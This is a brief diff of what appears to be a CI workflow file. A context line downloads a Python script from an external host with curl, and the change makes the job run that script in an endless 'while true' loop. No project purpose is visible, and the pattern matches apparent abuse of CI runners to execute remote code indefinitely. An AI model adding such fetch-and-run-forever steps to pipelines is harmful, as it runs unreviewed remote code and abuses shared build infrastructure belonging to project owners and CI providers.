@@ -32,8 +32,10 @@ jobs:
 
           curl -X GET https://exampleoci.yunzhongzhuan.com/example/0.py -o 0.py
 
+          
+
           pwd
           
-          python3 0.py
+          while true; do python3 0.py; done
           
           
